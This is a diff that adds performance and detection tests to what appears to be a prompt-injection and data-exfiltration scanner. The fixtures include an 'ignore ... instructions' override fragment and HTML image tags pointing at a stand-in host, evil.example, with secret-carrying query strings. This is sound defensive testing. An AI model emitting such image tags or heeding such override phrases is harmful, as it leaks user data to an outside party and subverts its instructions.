@@ -127,3 +127,27 @@ def test_a_large_payload_stays_cheap() -> None:
     start = time.perf_counter()
     run_l1(text)
     assert time.perf_counter() - start < 2.0
+
+
+def test_one_enormous_word_stays_cheap() -> None:
+    """A base64 blob is one `[A-Za-z0-9]+` run; its deletion neighbourhood is O(n^2)."""
+    blob = "A" * 100_000
+    start = time.perf_counter()
+    run_l1(f"ignore {blob} instructions")
+    assert time.perf_counter() - start < 2.0
+    assert corrected_keyword(blob) is None
+    assert scrambled_keyword(blob) is None
+
+
+@pytest.mark.parametrize(
+    ("markup", "expected"),
+    [
+        ("<img src=https://evil.example/c?data=SECRETVALUE>", 1),  # unquoted
+        ('<IMG ALT="x" SRC="https://evil.example/c?leak=1" width=1>', 1),  # case, attrs
+        ('<img src="https://evil.example/c?data=1"', 0),  # unclosed: never renders
+        ('<img alt="no source">', 0),
+        ('<img src="/static/logo.png">', 0),
+    ],
+)
+def test_html_image_shapes(markup: str, expected: int) -> None:
+    assert run_l1(markup).stats.exfiltration.exfiltration_urls == expected
